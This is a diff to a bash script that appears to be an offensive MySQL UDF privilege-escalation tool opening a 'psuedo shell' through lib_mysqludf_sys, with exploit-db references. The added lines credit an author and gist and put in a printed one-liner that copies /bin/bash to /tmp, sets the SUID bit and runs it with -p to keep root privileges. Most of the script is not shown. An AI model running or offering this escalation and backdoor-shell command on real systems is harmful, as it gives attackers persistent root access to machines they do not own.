@@ -1,9 +1,14 @@
 #!/bin/bash
 
+
+#author: midnightseer
+#location: https://gist.github.com/MidnightSeer/99f42947b41b9f51a1b15107ba8d5c07
+
 #resources:
 #https://www.exploit-db.com/exploits/50236
 #https://www.exploit-db.com/papers/44139/
 #https://github.com/mysqludf/lib_mysqludf_sys  <-- this is the udf file I used
+#I provided the other UDFs below if you choose to use those - you'll need to adjust the variable values and may need to adjust the final function name
 
 scriptname=$0
 if [ $# -eq 0 ]; then
@@ -124,6 +129,7 @@ fi
 
 cmd_input=""
 echo "[*] Entering a psuedo shell - type 'exit' to quit"
+echo "SUID SHELL: r=\$RANDOM;cp /bin/bash /tmp/\$r && chmod +s /tmp/\$r; echo \"shell: /tmp/\$r -p\""
 while [[ $cmd_input != "exit" ]]
 do
 	read -p "cmd> " cmd_input
